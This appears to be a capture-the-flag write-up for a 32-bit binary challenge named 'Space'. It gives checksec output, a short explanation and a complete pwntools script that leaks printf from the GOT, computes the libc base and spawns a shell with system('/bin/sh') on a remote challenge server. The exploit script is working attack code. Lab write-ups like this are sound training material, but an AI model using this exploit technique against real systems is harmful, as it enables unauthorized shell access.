# Space

Another 32 bit ELF with no protections enabled.
```bash
ubuntu@ubuntu:~/Desktop/Space$ file space
space: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=90e5767272e16e26e1980cb78be61437b3d63e12, not stripped
ubuntu@ubuntu:~/Desktop/Space$ checksec --file ./space 
[*] '/home/ubuntu/Desktop/Space/space'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
We can read only 31 characters, but that is enough.
We can leak the libc version by first leaking printf(), then fflush().
Then we can leak one of them and come back to main() to exploit the bug again and then run system(/bin/sh)

```python
#!/usr/bin/python3

from pwn import *

# we can read at most 31 bytes
# 18 is the offset, so we can have 3 bytes of payload after
IP, port = '138.68.182.108', 32346
context.binary = './space'
printf_plt = pack(0x08049040)
printf_got = pack(0x804b2d4)
read_got = pack(0x804b2d0)
flush_got = pack(0x804b2d8)
bin_sh_offset = 0x18f352
system_offset = 0x045420
printf_offset = 0x053de0
elf = ELF('./space', checksec=False)

leaked_printf = 0xf7e04340
leaked_lib_c_start_main = 0x0
offset = 18
padding = b'A'*offset
def main():
    r = remote(IP, port)
    #r = elf.process()
    #gdb.attach(r)
    payload = [padding, printf_plt, pack(elf.sym['main']), printf_got]
    payload = b''.join(payload)
    r.recv()
    r.sendline(payload)
    leak_str = r.recv()
    leak = u32(leak_str[:4].ljust(4, b'\x00'))
    print(f'The leaked printf is {hex(leak)}')
    libc_base = leak - printf_offset
    print(f'Leaked libcbase is {hex(libc_base)}')
    system = pack(libc_base + system_offset)
    bin_sh = pack(libc_base + bin_sh_offset)
    payload = [padding, system, p32(0xdeadbeef), bin_sh]
    payload = b''.join(payload)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

